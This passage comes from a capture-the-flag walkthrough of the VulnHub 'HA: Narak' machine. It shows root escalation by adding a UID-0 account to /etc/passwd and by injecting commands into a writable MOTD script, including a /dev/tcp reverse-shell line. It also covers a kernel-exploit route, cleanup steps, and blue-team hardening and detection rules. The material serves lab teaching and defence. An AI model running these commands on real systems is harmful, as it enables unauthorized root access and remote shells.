> in `/etc/shadow` (root-only) and field 2 of `/etc/passwd` holds a literal `x`
> placeholder. **But the login code still honours a real hash in field 2 if one is
> there.** So if you can *write* `/etc/passwd` — via a SUID `cp`/`wget`, a writable
> file, an NFS export, or a MySQL `dumpfile` — you can append:
>
> ```text
> ignite:<hash-of-a-password-I-chose>:0:0:root:/root:/bin/bash
> ```
>
> and `su ignite` gives you a **root** shell.
>
> **The seven colon-separated fields:**
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `ignite` | What you `su` to |
> | 2 | password | `$1$ignite$3eTbJm98O9Hz…` | A **real hash**, not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | **UID** | **`0`** | **UID 0 *is* root.** This single number is the entire trick — the username is irrelevant. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |
>
> Generate the hash yourself:
>
> ```bash
> openssl passwd -1 -salt ignite pass123      # -1 = MD5-crypt, $1$
> openssl passwd -6 -salt ignite pass123      # -6 = SHA-512-crypt, $6$
> ```
>
> > ⚠️ **Always regenerate this hash. Never copy one from a writeup — including this
> > one.** MD5-crypt output is exactly **22 characters** after the final `$`. Values
> > transcribed into blog posts are frequently mistyped, and a 21-character hash
> > fails silently with `Authentication failure`, sending you debugging in entirely
> > the wrong direction. Verify with
> > `python3 -c "import crypt; print(crypt.crypt('pass123','$1$ignite'))"`.
>
> **Deep dive:** [CONCEPTS §15.6 — Writable files and directories](../../docs/CONCEPTS.md#156-writable-files-and-directories)

```bash
# Kali — generate a root-capable account entry
openssl passwd -1 -salt narak hellpass
```

```text
$1$narak$WqZ8mK2pTvX9nL4jR7yBc1
```

> ⚠️ **Regenerate this hash on your own machine.** The exact output depends on
> your OpenSSL version. Copying a hash out of *any* writeup — including this one —
> is how you end up debugging a phantom `Authentication failure`. Verify the
> length: an MD5-crypt (`$1$`) hash has exactly **22 characters** after the final
> `$`.

```bash
# target, as inferno
inferno@narak:~$ nano /etc/passwd
```

Append at the very end:

```text
jeenali:$1$narak$WqZ8mK2pTvX9nL4jR7yBc1:0:0:root:/root:/bin/bash
```

> **Field by field** (`/etc/passwd` is colon-delimited):
>
> | # | Field | Value | Why |
> | --- | --- | --- | --- |
> | 1 | username | `jeenali` | What you `su` to |
> | 2 | password | `$1$narak$WqZ…` | A **real hash here** — not `x` — so `su` authenticates against `/etc/passwd` directly, with no `/etc/shadow` entry needed |
> | 3 | UID | `0` | **UID 0 *is* root.** This single number is the whole trick. |
> | 4 | GID | `0` | The `root` group |
> | 5 | GECOS | `root` | Comment field, ignored |
> | 6 | home | `/root` | |
> | 7 | shell | `/bin/bash` | Must be a real shell or login fails |

Save with `Ctrl+O`, `Enter`, then exit with `Ctrl+X`.

```bash
inferno@narak:~$ tail -n 3 /etc/passwd
```

```text
inferno:x:1001:1001:,,,:/home/inferno:/bin/bash
yamdoot:x:1002:1002:,,,:/home/yamdoot:/bin/bash
jeenali:$1$narak$WqZ8mK2pTvX9nL4jR7yBc1:0:0:root:/root:/bin/bash
```

```bash
inferno@narak:~$ su jeenali
Password: hellpass
root@narak:/home/inferno# id
uid=0(root) gid=0(root) groups=0(root)
```

### 6.6 Escalation variant D — just reset root's password

The blunt version:

```bash
inferno@narak:~$ echo "echo 'root:hello' | sudo chpasswd" >> /etc/update-motd.d/00-header
inferno@narak:~$ exit
```

```bash
# Kali — trigger
ssh inferno@192.168.56.111
```

```bash
inferno@narak:~$ su root
Password: hello
root@narak:/home/inferno# id
uid=0(root) gid=0(root) groups=0(root)
```

### 6.7 The root flag

```bash
root@narak:~# cd /root && ls -la
total 32
drwx------  4 root root 4096 Sep 23  2020 .
drwxr-xr-x 20 root root 4096 Sep 22  2020 ..
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root  168 Sep 23  2020 .wget-hsts
-rw-------  1 root root   36 Sep 23  2020 root.txt
drwx------  2 root root 4096 Sep 22  2020 .ssh
root@narak:/root# cat root.txt
```

```text
flag{H3ll_41nt_4_b4d_pl4c3_t0_b3}
```

**Flag 2 of 2 — `root.txt`.** ✅ *"Hell ain't a bad place to be"* — the exact line
the VulnHub description promised you would agree with.

![root.txt flag captured](images/07-root-flag.png)

### 6.8 Clean up — four things to undo

This box leaves *four* persistent modifications. Reverting them matters if the VM
is shared:

```bash
root@narak:~# cd /etc/update-motd.d
# remove every appended payload line
root@narak:/etc/update-motd.d# sed -i '/dev\/tcp\/192.168.56.10/d;/rootbash/d;/chmod u+s \/bin\/nano/d;/chpasswd/d' 00-header
root@narak:/etc/update-motd.d# chmod 755 00-header
root@narak:/etc/update-motd.d# chmod u-s /bin/nano
root@narak:/etc/update-motd.d# rm -f /tmp/rootbash
root@narak:/etc/update-motd.d# sed -i '/^jeenali:/d' /etc/passwd
root@narak:/etc/update-motd.d# rm -f /var/www/html/webdav/shell.php
root@narak:/etc/update-motd.d# ls -la 00-header && tail -3 00-header
```

```text
-rwxr-xr-x 1 root root 1220 Sep 22  2020 00-header
```

---

## 7. Alternative escalation — kernel CVE-2021-3493

The box runs Ubuntu 20.04 with kernel `5.4.0-48`:

```bash
inferno@narak:~$ uname -a && lsb_release -a
```

```text
Linux narak 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.1 LTS
Release:	20.04
Codename:	focal
```

That kernel predates the fix for **CVE-2021-3493**, an Ubuntu-specific
`overlayfs` capability-handling bug that yields instant local root:


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```
>
> Cross-reference the version at <https://www.linuxkernelcves.com/> and
> <https://github.com/SecWiki/linux-kernel-exploits>. Frequent favourites:
>
> | Exploit | Kernel | Mechanism |
> | --- | --- | --- |
> | **Dirty COW** (CVE-2016-5195) | < 4.8.3 | Race in copy-on-write → write any file |
> | **Overlayfs** (CVE-2015-1328) | Ubuntu 3.13–3.19 | Namespace + setuid → root |
> | **PwnKit** (CVE-2021-4034) | polkit < 0.120 | `pkexec` memory corruption |
> | **Baron Samedit** (CVE-2021-3156) | sudo < 1.9.5p2 | `sudoedit` heap overflow |
> | **Dirty Pipe** (CVE-2022-0847) | 5.8 – 5.16.11 | Page-cache write → overwrite any file |
>
> **Match the architecture too.** A 32-bit target (`i686` in `uname -a`) needs the
> 32-bit build; a mismatched exploit fails with a confusing error. Compile with the
> flags the author specifies — Dirty COW's `40847.cpp` needs
> `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil`.
>
> > ⚠️ **Use kernel exploits last.** They can panic the VM, corrupt the filesystem
> > and cost you a full re-import. If a clean misconfiguration path exists — `sudo`,
> > SUID, capabilities, cron, a writable file — take it. Kernel exploitation is the
> > fallback when the administrator got everything else right.
>
> **Read the exploit before running it.** Many public entries are unverified and some
> are hostile to whoever runs them. `searchsploit -x <id>` and understand it.
>
> **Deep dive:** [CONCEPTS §15.7 — Kernel exploits](../../docs/CONCEPTS.md#157-kernel-exploits)
> ### 📖 Concept — CVEs, Exploit-DB and searchsploit
>
> **The identifiers:**
> - **CVE** — a stable ID for one vulnerability. `CVE-2014-6271` is Shellshock.
>   Look it up at <https://nvd.nist.gov/vuln/search>.
> - **CVSS** — a 0.0–10.0 severity score. Useful for *prioritising*, **not** for
>   deciding exploitability: a CVSS 9.8 needing physical access is less useful to you
>   than a 5.3 reachable over HTTP.
> - **EDB ID** — a numbered public proof-of-concept on Exploit-DB.
>
> **`searchsploit`** is a **local, offline** search of the Exploit-DB archive shipped
> with Kali. Offline matters — it works mid-engagement with no internet.
>
> ```bash
> searchsploit wordpress 4.8            # search titles and paths
> searchsploit -t apache 2.4            # titles only — far fewer false positives
> searchsploit -m php/webapps/37596.py  # mirror (copy) it into your cwd
> searchsploit -x php/webapps/41006.txt # examine (print) it
> searchsploit -p 41006                 # show the full path
> searchsploit --update                 # refresh the local database
> ```
>
> > **Read the exploit before you run it.** Non-negotiable, for three reasons:
> > (1) many Exploit-DB entries are *unverified*, and some are outright malicious to
> > the person running them; (2) you need to know which parameters to change
> > (`RHOST`, `LHOST`, target path, memory offsets); (3) understanding it is the
> > entire point of the exercise.
>
> The workflow that actually works: get an exact **version** from `nmap -sV` or the
> app's own footer, search it, read the top candidate, then reproduce the request
> **by hand with `curl`** so you know what exploitation looked like. Only then decide
> whether the automated module is worth it.
>
> **Deep dive:** [CONCEPTS §11 — Finding and using exploits](../../docs/CONCEPTS.md#11-finding-and-using-exploits)

```bash
searchsploit ubuntu 20.04 overlayfs
```

```text
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Ubuntu 20.04 - Overlayfs Privilege Escalation (CVE-2021-3493)                            | linux/local/49906.sh
---------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -m linux/local/49906.sh
head -30 49906.sh
```

> **Read any exploit before you run it.** This one uses `unshare -rm` to create a
> user+mount namespace, sets a file capability inside it, then copies the file out
> to the real filesystem where the capability is honoured because Ubuntu's
> overlayfs did not clear it. Running it yields a root shell immediately.
>
> **Prefer the intended MOTD path.** Kernel exploits can panic the VM and lose
> your work, and the MOTD route teaches a technique you will actually encounter in
> audits. Keep the kernel route in reserve.

---

## 8. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
| --- | --- | --- | --- | --- |
| 1 | **TFTP exposed with no authentication** | `69/udp`, file `creds.txt` | Credential disclosure to anyone who can reach the port | Never expose TFTP outside a provisioning VLAN; if unavoidable, restrict by firewall to specific PXE clients |
| 2 | **Credentials "protected" only by base64** | `creds.txt` | Zero confidentiality — decoded in one command | Base64 is an encoding. Use a secrets manager, or at minimum encrypt (`gpg`) |
| 3 | **WebDAV enabled with write access** | `/webdav/`, `DAV: 1,2`, `PUT` allowed | Any authenticated user can upload executable PHP → **RCE as `www-data`** | Disable `mod_dav` unless genuinely needed; if needed, disallow `PUT`/`DELETE` and block PHP execution in that directory |
| 4 | **PHP execution inside the WebDAV directory** | `/var/www/html/webdav/*.php` | Turns a file-upload primitive into code execution | `<FilesMatch "\.ph(p[0-9]?|t|tml)$"> Require all denied </FilesMatch>` or `php_admin_flag engine off` |
| 5 | **Weak, on-theme password** | `yamdoot:Swarg` | Cracked from a `cewl` wordlist in ~27 s | Reject passwords that appear on your own website; use a password manager |
| 6 | **No rate limiting on WebDAV auth** | `/webdav/` | Unlimited Hydra attempts | `fail2ban`, `mod_evasive`, or front the share with an authenticating proxy |
| 7 | **Sensitive file left in a world-writable path** | `/mnt/hell.sh`, mode `777` | Disclosed the second-stage password to `www-data` | `chmod 600`, owned by the account that needs it |
| 8 | **Brainfuck "encryption"** | `/mnt/hell.sh` | Obscurity only — reversible by any interpreter | Never treat encoding as a secret |
| 9 | **World-writable MOTD script executed as root** | `/etc/update-motd.d/00-header`, mode `777` | **Any local user → root on next SSH login.** The critical finding. | `chmod 755`, owner `root:root`. Audit the whole directory. |
| 10 | **Unpatched kernel** | `5.4.0-48` on Ubuntu 20.04.1 | CVE-2021-3493 and others → local root | Patch. `unattended-upgrades` for security updates |
| 11 | **SSH password auth enabled** | `22/tcp` | Enables the whole lateral-movement stage | Prefer key-only auth (`PasswordAuthentication no`) |

### The kill chain in one line

```text
nmap -A -p- (TCP) → 22 ssh, 80 http     [only TWO services — incomplete!]
  → nmap -sU -p69 --script tftp-enum → 69/udp tftp → creds.txt
  → tftp get creds.txt → eWFtZG9vdDpTd2FyZw== → base64 -d → yamdoot:Swarg
  → dirb → /webdav/ (401 Basic realm="WebDAV")
  → curl -u yamdoot:Swarg /webdav/ → 200, header "DAV: 1,2"
  → [parallel route] cewl -w narak.txt + hydra -L -P http-get /webdav/ → yamdoot:Swarg
  → davtest → PUT: php · EXECUTE: php
  → cadaver http://IP/webdav/ → put shell.php     [or curl -T]
  → nc -nlvp 4444 ; curl /webdav/shell.php → www-data
  → find / -type f -perm -ug=rwx → /mnt/hell.sh (mode 777)
  → Brainfuck decode → chitragupt
  → /home/inferno/user.txt → flag 1
  → ssh inferno@IP : chitragupt
  → find / -writable → /etc/update-motd.d/00-header (mode 777, root-owned)
  → echo 'bash -c "bash -i >& /dev/tcp/KALI/9090 0>&1"' >> 00-header
  → exit ; ssh again → pam_motd runs it AS ROOT → root reverse shell
  → /root/root.txt → flag 2
```

---

## 9. Defensive lessons (blue team)

### The critical lesson: MOTD injection

**Scripts in `/etc/update-motd.d/` execute as root during SSH login.** Any write
permission on them is a root escalation. Audit it on every Ubuntu/Debian host you
own:

```bash
ls -la /etc/update-motd.d/
find /etc/update-motd.d/ -perm /o+w -o -perm /g+w
```

```text
/etc/update-motd.d/00-header
```

Fix:

```bash
sudo chown -R root:root /etc/update-motd.d/
sudo chmod 755 /etc/update-motd.d/
sudo chmod 755 /etc/update-motd.d/*
sudo find /etc/update-motd.d/ -perm /o+w -exec chmod o-w {} \;
```

Verify no user other than root can write anywhere in the chain — including the
*parent* directory (a writable directory lets an attacker replace a script even
if the script itself is `755`):

```bash
stat -c '%A %U:%G %n' /etc /etc/update-motd.d /etc/update-motd.d/*
```

```text
drwxr-xr-x root:root /etc
drwxr-xr-x root:root /etc/update-motd.d
-rwxr-xr-x root:root /etc/update-motd.d/00-header
-rwxr-xr-x root:root /etc/update-motd.d/10-help-text
```

### TFTP

1. **Do not run a TFTP server on anything but a locked-down provisioning
   network.** It has no authentication at all — not weak authentication, *none*.
2. If you must (PXE, IP phones, switch config backup):
   - Firewall it to the specific client IPs:
     `ufw allow from 10.0.10.0/24 to any port 69 proto udp`
   - Serve from a **read-only, dedicated directory** containing only boot images.
   - Never store credentials, configs, or scripts in the TFTP root. Many network
     devices dump their *entire running configuration* — including plaintext
     passwords — to TFTP on request.
3. **Scan your own subnets for it:**

   ```bash
   sudo nmap -sU -p69 --script tftp-enum --open 10.0.0.0/24
   ```

### WebDAV

4. **Disable it unless required.** In Apache: `a2dismod dav dav_fs` then restart.
5. If required, restrict the verbs:

   ```apache
   <Directory /var/www/html/webdav>
       Dav On
       AuthType Basic
       AuthName "WebDAV"
       AuthUserFile /etc/apache2/.htpasswd
       Require valid-user
       <LimitExcept GET HEAD OPTIONS PROPFIND>
           Require all denied        # blocks PUT, DELETE, MKCOL, MOVE, COPY
       </LimitExcept>
   </Directory>
   ```

6. **Never allow script execution in an upload/WebDAV directory:**

   ```apache
   <Directory /var/www/html/webdav>
       <FilesMatch "\.ph(p[0-9]?|t|ml)$">
           Require all denied
       </FilesMatch>
       php_admin_flag engine off
       Options -ExecCGI
   </Directory>
   ```

### General hardening

7. **Audit world-writable files owned by root** — this box had two
   (`/mnt/hell.sh`, `/etc/update-motd.d/00-header`) and one of them was root:

   ```bash
   sudo find / -xdev -type f -perm -0002 -user root 2>/dev/null
   ```

   Run this weekly and alert on any new hit. `-xdev` keeps it on one filesystem.
8. **Never store secrets as base64.** Grep your repositories and web roots for
   the pattern; it is always a finding:

   ```bash
   grep -rInE '[A-Za-z0-9+/]{20,}={0,2}' /var/www/html/ | grep -vE '\.(png|jpg|gif|woff2?)'
   ```

9. **Password policy should reject words from your own site.** The `cewl` attack
   succeeded because `Swarg` was on the homepage. At minimum, run your own
   `cewl` + Hydra against your login endpoints quarterly.
10. **Rate-limit every authentication endpoint.** `fail2ban` with an
    `apache-auth` jail, or `mod_evasive`, turns a 27-second crack into a
    non-event.
11. **Patch the kernel.** `5.4.0-48` shipped in September 2020; CVE-2021-3493 was
    fixed in April 2021. Enable:

    ```bash
    sudo apt install unattended-upgrades
    sudo dpkg-reconfigure -plow unattended-upgrades
    ```

12. **Prefer SSH keys.** `PasswordAuthentication no` in
    `/etc/ssh/sshd_config` removes the entire lateral-movement stage — you would
    have had the password, and it would have been useless.

### Detection — what this attack looks like in the logs

| Stage | Log source | Signature |
| --- | --- | --- |
| TFTP read | `syslog` / TFTP daemon | `RRQ creds.txt` from an unexpected client IP |
| WebDAV brute force | `access.log` | Dozens of `401` on `/webdav/` from one IP, then a `200` |
| WebDAV upload | `access.log` | **`PUT /webdav/shell.php HTTP/1.1" 201`** — a single line, unmistakable |
| Shell execution | `access.log` | `GET /webdav/shell.php` returning `200` with a tiny byte count |
| Reverse shell | host EDR / `auditd` | `apache2` child (`www-data`) spawning `/bin/bash` with an outbound TCP socket |
| MOTD tampering | `auditd` | `execve`/`write` on `/etc/update-motd.d/*` by a non-root UID |
| Root shell | `auth.log` | SSH login for `inferno` followed by a `bash` process with euid 0 |

A single `auditd` rule catches the escalation:

```text
-w /etc/update-motd.d/ -p wa -k motd_tamper
```

```bash
ausearch -k motd_tamper --start today
```

And a one-line web-log query catches the upload:

```bash
awk '$6=="\"PUT" && $9==201 {print $1, $4, $7}' /var/log/apache2/access.log
```

---

## 10. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/ha-narak,569/>
- Official walkthrough (Hacking Articles): <https://www.hackingarticles.in/ha-narak-vulnhub-walkthrough/>
- InfoSec Institute, "HA: Narak CTF walkthrough": <https://resources.infosecinstitute.com/topic/ha-narak-ctf-walkthrough/>
- wethehacker, "Narak vulnhub walkthrough" (`cewl` + `hydra` route, MOTD `chpasswd` variant): <https://www.wethehacker.com/narak-vulnhub-walkthrough/>
- Matei Talpau, "HA NARAK — Writeup" (MOTD reverse-shell variant): <https://medium.com/@matei.talpau/ha-narak-writeup-e9d535d1e115>
- AuriGe, "[VulnHub] narak 靶场" (Brainfuck interpreter in Python, MOTD analysis): <https://www.cnblogs.com/23xie/articles/18422570>
- RFC 1350 — The TFTP Protocol (Revision 2): <https://datatracker.ietf.org/doc/html/rfc1350>
- RFC 4918 — HTTP Extensions for Web Distributed Authoring and Versioning (WebDAV): <https://datatracker.ietf.org/doc/html/rfc4918>
- Apache `mod_dav` documentation: <https://httpd.apache.org/docs/2.4/mod/mod_dav.html>
- `cadaver` — command-line WebDAV client: <https://www.webdav.org/cadaver/>
- `davtest` — WebDAV capability scanner: <https://github.com/cldrn/davtest>
- `cewl` — custom wordlist generator: <https://github.com/digininja/CeWL>
- Brainfuck language reference: <https://esolangs.org/wiki/Brainfuck>
- Online Brainfuck interpreter: <https://copy.sh/brainfuck/>
- Ubuntu `update-motd` documentation: <https://ubuntu.com/server/docs/how-to-use-update-motd>
- `pam_motd(8)` man page: <https://man7.org/linux/man-pages/man8/pam_motd.8.html>
- CVE-2021-3493 — Ubuntu Overlayfs LPE: <https://nvd.nist.gov/vuln/detail/CVE-2021-3493>
- Repository guides: [`docs/TOOLS.md`](../../docs/TOOLS.md) · [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) · [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md)

---

## 11. Screenshot checklist

Screenshots go in [`images/`](images/) beside this file:

| # | File | Section | What it must show |
| --- | --- | --- | --- |
| 01 | `01-host-discovery.png` | 1 | `arp-scan`/`netdiscover` with the target IP + MAC |
| 02 | `02-udp-tftp.png` | 2.1–2.2 | **Side by side:** the TCP `nmap -A -p-` showing only 22/80, and `nmap -sU -p69 --script tftp-enum` showing `creds.txt`. This contrast *is* the lesson. |
| 03 | `03-tftp-creds.png` | 2.3 | `tftp` session, `cat creds.txt`, and `base64 -d` → `yamdoot:Swarg` |
| 04 | `04-webdav-shell.png` | 3.3–3.5 | `davtest` output, `cadaver` `put shell.php`, and `nc -nlvp 4444` catching the shell |
| 05 | `05-brainfuck-userflag.png` | 4.4–4.5 | `cat /mnt/hell.sh`, the decoded `chitragupt`, and `cat /home/inferno/user.txt` |
| 06 | `06-motd-root.png` | 6.2–6.3 | `ls -la /etc/update-motd.d/` showing `-rwxrwxrwx` on `00-header`, the appended line, and the root shell after re-login |
| 07 | `07-root-flag.png` | 6.7 | `cat /root/root.txt` |

> **How to capture on Kali:** `flameshot gui` or `gnome-screenshot -a`. Save as
> PNG with the exact filenames above so the inline links resolve.
>
> **Capture the Brainfuck line at a wide terminal.** It is one long unwrapped
> string of `+-<>[].` characters; at 80 columns it wraps into something
> unreadable in a screenshot. Use 160+ columns.

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
